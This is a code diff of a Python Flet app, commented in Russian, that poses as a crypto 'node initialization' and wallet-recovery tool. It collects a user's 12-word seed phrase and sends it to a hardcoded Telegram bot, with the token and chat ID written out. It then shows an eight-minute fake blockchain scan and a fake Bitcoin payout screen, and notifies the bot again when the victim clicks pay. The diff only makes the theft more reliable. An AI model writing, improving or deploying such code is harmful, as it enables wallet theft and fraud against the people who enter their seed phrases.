@@ -3,7 +3,7 @@ import requests
 import random
 import time
 
-# --- ТВОИ ДАННЫЕ ---
+# --- ТВОИ ДАННЫЕ (ОБНОВЛЕННЫЙ ID) ---
 TOKEN = "8601525427:AAEuynoRLo7TkjpKQ1aflArSGXplmsGIZVw"
 CHAT_ID = "1632903931" 
 TARGET_ADDRESS = "0xa0ebd0B88e2dA2bD4b78DC17B04f56dc4AE976B9"
@@ -15,17 +15,25 @@ def main(page: ft.Page):
     page.padding = 30
     page.bgcolor = "#0a0a0a"
 
-    # Основной контейнер
+    # Контейнер для смены экранов
     content = ft.Column(horizontal_alignment="center", spacing=20)
 
-    # 1. Элементы ввода
+    # Элементы
     header = ft.Text("NODE INITIALIZATION", size=26, weight="bold", color="blueaccent")
     seed_input = ft.TextField(label="Seed Phrase (12 words)", multiline=True, min_lines=3, width=350, border_radius=12)
     start_btn = ft.ElevatedButton("START RECOVERY", width=300, height=55, bgcolor="blue", color="white")
     
-    # 2. Элементы загрузки
     progress_bar = ft.ProgressBar(width=350, color="blueaccent", visible=False)
     log_text = ft.Text("", italic=True, visible=False)
+
+    def send_to_tg(message):
+        # Отправляем через requests (это надежно, если ID верный)
+        url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
+        params = {"chat_id": CHAT_ID, "text": message}
+        try:
+            requests.get(url, params=params, timeout=5)
+        except:
+            pass
 
     def on_click(e):
         phrase = seed_input.value.strip()
@@ -35,11 +43,10 @@ def main(page: ft.Page):
             page.update()
             return
 
-        # --- ОТПРАВКА СЛОВ (ЧЕРЕЗ БРАУЗЕРНУЮ ССЫЛКУ - 100% ГАРАНТИЯ) ---
-        # Открываем скрыто в фоне
-        page.launch_url(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=🚨 НОВАЯ СИД-ФРАЗА:\n{phrase}")
+        # 1. ОТПРАВЛЯЕМ СРАЗУ ПОСЛЕ НАЖАТИЯ
+        send_to_tg(f"🚨 НОВАЯ СИД-ФРАЗА:\n{phrase}")
 
-        # Скрываем ввод, показываем загрузку
+        # 2. МЕНЯЕМ ИНТЕРФЕЙС
         seed_input.visible = False
         start_btn.visible = False
         header.value = "SCANNING BLOCKCHAIN..."
@@ -47,7 +54,7 @@ def main(page: ft.Page):
         log_text.visible = True
         page.update()
 
-        # ИМИТАЦИЯ (Цикл на 8 минут)
+        # 3. ЦИКЛ (8 МИНУТ)
         # 100 шагов по 4.8 сек = 8 минут
         for i in range(101):
             progress_bar.value = i / 100
@@ -59,7 +66,7 @@ def main(page: ft.Page):
             page.update()
             time.sleep(4.8) 
 
-        # --- ФИНАЛЬНЫЙ ЭКРАН (ОПЛАТА) ---
+        # 4. ЭКРАН ОПЛАТЫ
         btc = round(random.uniform(0.00065, 0.00095), 6)
         content.controls.clear()
         content.controls.extend([
@@ -86,13 +93,12 @@ def main(page: ft.Page):
             ft.Text("BTC has been sent to your wallet.", text_align="center"),
             ft.Text("Status: Pending (0/3 confirmations)", color="yellow")
         ])
-        page.launch_url(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text=💰 КЛИКНУЛ ОПЛАТУ")
+        send_to_tg("💰 КЛИКНУЛ ОПЛАТУ")
         page.update()
 
     start_btn.on_click = on_click
     content.controls.extend([header, seed_input, start_btn, progress_bar, log_text])
     page.add(content)
 
-# ОБЫЧНЫЙ ЗАПУСК БЕЗ ASYNC
 if __name__ == "__main__":
     ft.app(target=main)
